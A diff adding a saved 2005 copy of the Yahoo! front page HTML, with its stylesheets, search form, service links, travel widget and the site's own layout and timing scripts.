+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+#mt:unknown {
+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+H2:unknown {
+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+#mn:unknown {
+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+#f:unknown {
+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+#ss:unknown {
+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+DIV.ct:unknown {
+	CLEAR: both; DISPLAY: block; FONT-SIZE: 0px; VISIBILITY: hidden; LINE-HEIGHT: 0px; HEIGHT: 0px; content: "."
+}
+#yb .ct {
+	PADDING-RIGHT: 1px; PADDING-LEFT: 9px; PADDING-BOTTOM: 9px; PADDING-TOP: 9px
+}
+#yb .bl {
+	WIDTH: 46%
+}
+#yb .br {
+	WIDTH: 54%
+}
+</STYLE>
+<!--[if IE]>
+<STYLE>#yb {
+	WIDTH: 48.9%
+}
+#yf {
+	WIDTH: 48.9%
+}
+#yb .br {
+	MARGIN-RIGHT: -9px
+}
+#y .so IMG {
+	MARGIN-LEFT: -11px
+}
+#ld {
+	PADDING-TOP: 1px; HEIGHT: 1.25em
+}
+HR {
+	MARGIN: -3px 0px
+}
+#ld A {
+	POSITION: static
+}
+.nw {
+	POSITION: absolute
+}
+#c2 {
+	MARGIN-LEFT: -300px
+}
+#mt {
+	HEIGHT: 0.1em
+}
+H2 {
+	HEIGHT: 0.1em
+}
+#f {
+	HEIGHT: 0.1em
+}
+#mn {
+	HEIGHT: 0.1em
+}
+#ss {
+	HEIGHT: 0.1em
+}
+DIV.ct {
+	HEIGHT: 0.1em
+}
+#h {
+	HEIGHT: 0.1em
+}
+.l {
+	HEIGHT: 0.1em
+}
+.r {
+	HEIGHT: 0.1em
+}
+.si .m A {
+	FLOAT: left
+}
+.si .m EM {
+	FLOAT: left
+}
+#em {
+	WIDTH: 100%
+}
+.r {
+	WIDTH: 100%
+}
+#ws {
+	PADDING-RIGHT: 1px; PADDING-LEFT: 1px; PADDING-BOTTOM: 1px; PADDING-TOP: 1px
+}
+#we {
+	MARGIN: -4px
+}
+#z {
+	WIDTH: 75%
+}
+#w .r {
+	PADDING-RIGHT: 18px; WIDTH: 14em
+}
+#w .mr {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+#w .b IMG {
+	MARGIN-LEFT: -3px
+}
+
+@media Print    
+{
+HR {
+	MARGIN: auto
+}
+#dc {
+	WIDTH: 760px
+}
+#c1 {
+	WIDTH: 440px
+}
+#c2 {
+	WIDTH: 320px
+}
+
+}
+</STYLE>
+<![endif]-->
+<SCRIPT language=javascript>var _ie5=0</SCRIPT>
+<!--[if IE 5]><script language=javascript>_ie5=1</script><noscript><style>#em,.r{width:22.3em}</style></noscript><![endif]-->
+<SCRIPT language=javascript>
+d=document;
+agt=navigator.userAgent.toLowerCase();
+win=((agt.indexOf("win")!=-1)||(agt.indexOf("16bit")!=-1));
+d.domain="yahoo.com";
+var _ie=0,now,mon,day,now,hour,min,ampm,time,str,tz,end,beg,_hdi=0;
+now=new Date(sss*1000);
+mon=new Array("Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec");
+day=new Array("Sun","Mon","Tue","Wed","Thu","Fri","Sat");
+hour=now.getHours();
+min=now.getMinutes();
+ampm=(hour>=12)?"pm":"am";hour=(hour==0)?12:(hour>12)?hour-12:hour;
+min=(min<10)?"0"+min:min;
+tz="";
+if(_ie5){
+str=now.toString();
+end=str.lastIndexOf(" ");
+beg=str.lastIndexOf(" ",end-1)+1;
+if(_ie5&&end-beg==3){tz=" "+str.charAt(beg)+"T";}
+}
+time=hour+":"+min+ampm+tz+", <nobr>"+day[now.getDay()]+" "+mon[now.getMonth()]+" "+now.getDate()+"</nobr>";
+function zp(z){d.w.p.value=z;gw(d.w);}
+function gw(f){
+if(d.w.sv.checked==true){zv='on';}else{zv='off';}
+procframe.location.replace("http://b.www.yahoo.com/module/wtr_tr.php?p="+escape(f.p.value)+"&sv="+zv);
+return false;
+}
+function hd1(){
+if(_hdi==0){
+sz=d.getElementById('m4');
+if(sz.offsetHeight<52){dc.style.width='760px';}
+else if(sz.offsetHeight>53){dc.style.width='1000px';}
+else if(_ie5&&win&&(screen.deviceXDPI>screen.logicalXDPI)){dc.style.width='1200px';}
+else{dc.style.width="56.4em";}
+}
+}
+</SCRIPT>
+
+<SCRIPT language=javascript>
+function funld() {
+var img=new Image;
+now=new Date;
+t6=now.getTime();
+img.src='http://www.yahoo.com/'+(ylp?ylp:'p.gif?t=0')+cc+'&ni='+document.images.length+'&sss='+sss+'&t1='+t1+'&d1='+(t2-t1)+'&d2='+(t3-t1)+'&d3='+(t4-t1)+'&d4='+(t5-t1)+'&d5='+(t6-t1);
+}
+window.onbeforeunload=funld;
+</SCRIPT>
+
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
+<BODY id=bd>
+<DIV id=dc>
+<DIV id=h><A id=hm 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/hs">Make 
+Yahoo! your home page</A>
+<DIV class=m id=tb><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/tb"><SPAN 
+id=tba>Get</SPAN> Yahoo! Toolbar with Anti-Spy</A></DIV></DIV><!--[if IE]>
+<SCRIPT language=javascript>
+_ie=1;
+var sp='http://www.yahoo.com';
+hm.style.behavior='url(#default#homepage)';
+hm.onclick=function(){hm.setHomePage(sp)};
+hp=(hm.isHomePage(sp)||hm.isHomePage(sp+'/'));
+var cp=0,cpre=/ CP=v=(\d+)&br=(.)/,cpv,cpbr,c=' '+d.cookie;
+if(c.match(cpre)){
+cp=1;
+cpv=RegExp.$1;
+cpbr=RegExp.$2;
+if(cpbr=='i'&&cpv<50505){
+cp=0;
+d.getElementById('tba').innerHTML='New';
+}
+}
+if(!hp||!cp)h.style.display='block';
+if(!hp)hm.style.display='block';
+if(!cp)tb.style.display='block';
+</SCRIPT>
+<NOSCRIPT>
+<STYLE>#c2 {
+	MARGIN: 0px; POSITION: absolute
+}
+</STYLE>
+</NOSCRIPT><![endif]-->
+<DIV id=m>
+<DIV id=yl>
+<H1><IMG height=44 alt=Yahoo! src="Yahoo!_files/y3.gif" width=232 border=0>
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['blrlFNibyQg-']='&U=13ar4n8ca%2fN%3dblrlFNibyQg-%2fC%3d289534.5461226.6542184.5322130%2fD%3dHEADR%2fB%3d2373001';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAT4GN5X.gif" 
+width=1></NOSCRIPT></H1></DIV><SPAN id=m1><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/25"><IMG 
+height=36 alt="" src="Yahoo!_files/125.gif" width=36>Finance</A></SPAN> <SPAN 
+id=m2><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/3m"><IMG 
+height=36 alt="" src="Yahoo!_files/13441.gif" width=36>Music</A></SPAN> <SPAN 
+id=m3><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/2h"><IMG 
+height=36 alt="" src="Yahoo!_files/154.gif" width=36>Autos</A></SPAN> <SPAN 
+id=m4><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/m1"><IMG 
+height=36 alt="" src="Yahoo!_files/ml.gif" width=36>Mail</A></SPAN> <SPAN 
+id=m5><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/i1"><IMG 
+height=36 alt="" src="Yahoo!_files/my.gif" width=36>My Yahoo!</A></SPAN> <SPAN 
+id=m6><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/p1"><IMG 
+height=36 alt="" src="Yahoo!_files/msg.gif" width=36>Messenger</A></SPAN> </DIV>
+<SCRIPT language=javascript>if(_ie){hd1();_hdi=1;}</SCRIPT>
+<A id=mk title="Yahoo! Search" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ot"></A>
+<FORM class=v1 id=s name=sf1 action=r/zz>
+<FIELDSET id=fs>
+<DIV id=v><SPAN id=c>Select Search Category:</SPAN> <A class=h id=v1 
+title="Search the Web" onfocus=t(this) onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/sx/*-http://search.yahoo.com/search"><B></B>Web</A> 
+<EM id=e1></EM><A class=o id=v2 title="Search Images" onfocus=t(this) 
+onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/00/*-http://images.search.yahoo.com/search/images"><B></B>Images</A> 
+<EM id=e2></EM><A class=o id=v3 title="Search Video" onfocus=t(this) 
+onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/14/*-http://video.search.yahoo.com/search/video"><B></B>Video</A> 
+<EM id=e3></EM><A class=o id=v4 title="Search Directory" onfocus=t(this) 
+onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/0a/*-http://search.yahoo.com/search/dir"><B></B>Directory</A> 
+<EM id=e4></EM><A class=o id=v5 title="Search Local" onfocus=t(this) 
+onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/0w/*-http://local.yahoo.com/results"><B></B>Local</A> 
+<EM id=e5></EM><A class=o id=v6 title="Search News" onfocus=t(this) 
+onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/05/*-http://news.search.yahoo.com/search/news"><B></B>News</A> 
+<EM id=e6></EM><A class=o id=v7 title="Search Products" onfocus=t(this) 
+onclick="return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/06/*-http://search.shopping.yahoo.com/search;_ylc=X3oDMTFncmo3bG5vBF9HA2dsb2JhbF9ncm91cARfUwMyNzE2MTQ5BHNlYwNzZWFyY2gEc2xrA2J1dHRvbg--"><B></B>Products</A> 
+</DIV>
+<SCRIPT language=javascript>
+var lt=d.getElementById('v1');
+sbc=0;
+if(d.images.length&&(d.images[0].src.indexOf('/dsl')>0||d.images[0].src.indexOf('/dial')>0)){
+d.getElementById('v5').style.display=d.getElementById('e5').style.display='none';
+sbc=1;
+}
+d.getElementById('v').style.display='block';
+</SCRIPT>
+<A id=mk2 title="Yahoo! Search" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ot"></A>
+<DIV id=ss><SPAN class=f id=sw><LABEL class=np id=sb for=fp>Search 
+for:</LABEL></SPAN> <SPAN class=f id=ip><INPUT id=fp name=p></SPAN> 
+<NOSCRIPT><SPAN class=f id=sl><SELECT name=u> <OPTION 
+  value=http://search.yahoo.com/search?fr=FP-pull-web-t&amp;p= selected>on the 
+  Web</OPTION> <OPTION 
+  value=http://images.search.yahoo.com/search/images?fr=FP-pull-img-t&amp;p=>in 
+  Images</OPTION> <OPTION 
+  value=http://video.search.yahoo.com/search/video?fr=FP-pull-vid-t&amp;p=>in 
+  Video</OPTION> <OPTION 
+  value=http://search.yahoo.com/search/dir?fr=FP-pull-img-t&amp;p=>in 
+  Directory</OPTION> <OPTION 
+  value=http://local.yahoo.com/results?fr=FP-pull-lcl-t&amp;toggle=1&amp;p=>in 
+  Local</OPTION> <OPTION 
+  value=http://news.search.yahoo.com/search/news?fr=FP-pull-news-t&amp;p=>in 
+  News</OPTION> <OPTION 
+  value=http://search.shopping.yahoo.com/search;_ylc=X3oDMTFncmo3bG5vBF9HA2dsb2JhbF9ncm91cARfUwMyNzE2MTQ5BHNlYwNzZWFyY2gEc2xrA2J1dHRvbg--?fr=FP-pull-prod-t&amp;p=>in 
+  Products</OPTION></SELECT></SPAN> </NOSCRIPT><SPAN class=f id=sn><INPUT class=s2 id=st type=submit value="Yahoo! Search" name=sm></SPAN> 
+<SPAN class=f id=l>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+  <TBODY>
+  <TR>
+    <TD id=ld>• <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/so">Advanced</A><BR>• 
+      <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/mk">My 
+      Web <IMG style="MARGIN: 0px" height=5 src="Yahoo!_files/beta.gif" 
+      width=17></A></TD></TR></TBODY></TABLE></SPAN><INPUT type=hidden 
+value=FP-tab-web-t name=fr> <INPUT type=hidden value=1 name=toggle> <INPUT 
+type=hidden value=UTF-8 name=ei> </DIV></FIELDSET> </FORM>
+<SCRIPT language=javascript>
+box=d.sf1.p;
+d.getElementById('ip').style.width='52.4%';
+d.getElementById('sb').innerHTML='Search the Web:';
+d.sf1.action="r/sx/*-http://search.yahoo.com/search";
+</SCRIPT>
+
+<SCRIPT language=javascript>
+now=new Date;
+t2=now.getTime();
+</SCRIPT>
+
+<DIV id=t>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+  <TBODY>
+  <TR>
+    <TD noWrap><FONT face=arial size=-1><A 
+      href="http://us.ard.yahoo.com/SIG=12juuko8i/M=353777.6573477.7616240.6389354/D=yahoo_top/S=2716149:PHL1/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796382/R=0/SIG=12clcna12/*http://www.walmart.com/reflect.gsp?adid=1500000000000002334120&amp;dest=111654">Tune 
+      in to value at <B>Wal-Mart</B>. Delphi Roady2 XM Satellite Radio $94.27 - 
+      In-store &amp; online</A></FONT></TD></TR></TBODY></TABLE>
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['b1rlFNibyQg-']='&U=139knqi4g%2fN%3db1rlFNibyQg-%2fC%3d353777.6573477.7616240.6389354%2fD%3dPHL1%2fB%3d2796382';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAU3KH45.gif" 
+width=1></NOSCRIPT></DIV>
+<DIV id=mn>
+<DIV id=c1>
+<DIV class=l id=y>
+<H2 class=so><IMG height=25 src="Yahoo!_files/v5_mail_t.gif" width=50><SPAN 
+class=f>Check your mail status: <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/l6">Sign 
+In</A></SPAN> <SPAN class=m>Free mail: <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/m7">Sign 
+Up</A></SPAN></H2>
+<DIV class=ct>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/cr">Autos</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/yc">Chat</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/sq">Finance</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/pl">Games</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/g3">GeoCities</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/gp">Groups</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/wm">Health</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/h1">Horoscopes</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/jb">HotJobs</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/yg">Kids</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/m2">Mail</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/mp">Maps</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/p2">Messenger</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/oa">Mobile</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/mf">Movies</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/uf">Music</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/i2">My 
+Yahoo!</A> <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/dn">News</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ps">People 
+Search</A> <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/pr">Personals</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/fo">Photos</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/r1">Real 
+Estate</A> <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/sh">Shopping</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ys">Sports</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ta">Travel</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/tg">TV</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/yp">Yellow 
+Pages</A> 
+<DIV class=mr><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/xy">All 
+Y! Services...</A></DIV></DIV></DIV></DIV>
+<DIV id=wm>
+<SCRIPT language=javascript>var mText=new Array('Enter a city name','');function checkInput(){if(d.tra.p.value==mText[1]){d.tra.p.value=mText[0];}}function remInput(){if(d.tra.p.value==mText[0]){d.tra.p.value=mText[1];}}</SCRIPT>
+
+<TABLE cellSpacing=0 width="100%" border=0>
+  <FORM name=tra 
+  action=s/235359/*http://us.lrd.yahoo.com/_ylc=X3oDMTFvZDJuZnQ4BF9TAzI3MTYxNDkEX3MDODYyNzYxNwRwb3MDMQRzZWMDZnAtd2VzdG1hbnRsZQRzbGsDc2VhcmNo/SIG=11la46mjf/**http%3a//search.travel.yahoo.com/bin/search/travel>
+  <TBODY>
+  <TR>
+    <TD bgColor=#fcbf83>
+      <TABLE cellSpacing=0 width="100%" bgColor=white border=0>
+        <TBODY>
+        <TR>
+          <TD>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+              <TBODY>
+              <TR bgColor=#f49706>
+                <TD height=21><A 
+                  href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243290"><IMG 
+                  height=12 alt="Yahoo! Travel" hspace=5 
+                  src="Yahoo!_files/hdr_hut.gif" width=99 border=0></A></TD>
+                <TD noWrap align=right><FONT face=arial color=#f1e4bb 
+                  size=-1><A 
+                  href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243291"><FONT 
+                  color=white><U>Flights</U></FONT></A> | <A 
+                  href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243292"><FONT 
+                  color=white><U>Hotels</U></FONT></A> | <A 
+                  href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243293"><FONT 
+                  color=white><U>Cars</U></FONT></A> | <A 
+                  href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243294"><FONT 
+                  color=white><U>Vacations</U></FONT></A> | <A 
+                  href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243295"><FONT 
+                  color=white><U>Cruises</U></FONT></A>&nbsp;</FONT></TD></TR>
+              <TR>
+                <TD colSpan=2 height=1><SPACER height="1" type="block"></TD></TR>
+              <TR>
+                <TD colSpan=2>
+                  <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                    <TBODY>
+                    <TR>
+                      <TD vAlign=top width=171><A 
+                        href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243296"><IMG 
+                        height=133 alt="Plan Your Trip" 
+                        src="Yahoo!_files/img_hut.jpg" width=170 
+border=0></A></TD>
+                      <TD vAlign=top align=middle>
+                        <TABLE cellSpacing=0 cellPadding=0 width="100%" 
+border=0>
+                          <TBODY>
+                          <TR>
+                            <TD bgColor=#f4be5b height=50>
+                              <TABLE cellSpacing=0 cellPadding=0 border=0>
+                                <TBODY>
+                                <TR>
+                                <TD width=10 rowSpan=2><SPACER type="block" 
+                                width="10"></TD>
+                                <TD height=22><FONT face=arial color=#e2781a 
+                                size=-1><B>Search Yahoo! Travel 
+                                Guides:</B></FONT></TD></TR>
+                                <TR>
+                                <TD height=25><FONT face=arial size=-1><INPUT 
+                                class=term id=srch onblur=checkInput(); 
+                                style="COLOR: #666" onfocus=remInput(); 
+                                value="Enter a city name" name=p> <INPUT type=submit value=Search></FONT></TD></TR></TBODY></TABLE></TD></TR>
+                          <TR>
+                            <TD height=1><SPACER height="1" 
+type="block"></TD></TR>
+                          <TR>
+                            <TD bgColor=#f4e9b7 height=82>
+                              <TABLE cellSpacing=0 cellPadding=0 width="100%" 
+                              border=0>
+                                <TBODY>
+                                <TR>
+                                <TD width=10 rowSpan=2><SPACER type="block" 
+                                width="10"></TD>
+                                <TD height=18><FONT face=arial color=#f8a94d 
+                                size=-1><B>Today's Travel 
+                                Deals</B></FONT></TD></TR>
+                                <TR>
+                                <TD style="LINE-HEIGHT: 90%" height=55><FONT 
+                                face=verdana color=#333333 size=-2>Flights: <A 
+                                href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/240025">Save 
+                                40% on Airfares</A>*<BR>Last Minute: <A 
+                                href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243297">Getaways 
+                                From Under $250</A>*<BR>Vegas: <A 
+                                href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243298">2 
+                                Nights Hotel + Air from 
+                                $199</A>*<BR></FONT><FONT face=verdana 
+                                size=-2><A 
+                                href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/233341">*Info 
+                                on taxes and 
+                              fees</A></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></FORM></TBODY></TABLE><!-- ue.corp.yahoo.com compressed/chunked Mon Jun 13 10:01:43 PDT 2005 --></DIV>
+<DIV id=mm>
+<DIV class=l id=yb>
+<H2><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/c9">Yahoo! 
+Small Business</A></H2>
+<DIV class=ct>
+<DIV class="b bl"><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/h9">Web 
+Hosting</A> <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/d9">Domain 
+Names</A><!-- SpaceID=2716149 loc=MM2 noad-spid --> </DIV>
+<DIV class="b br"><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/e9">Sell 
+Online</A> <A 
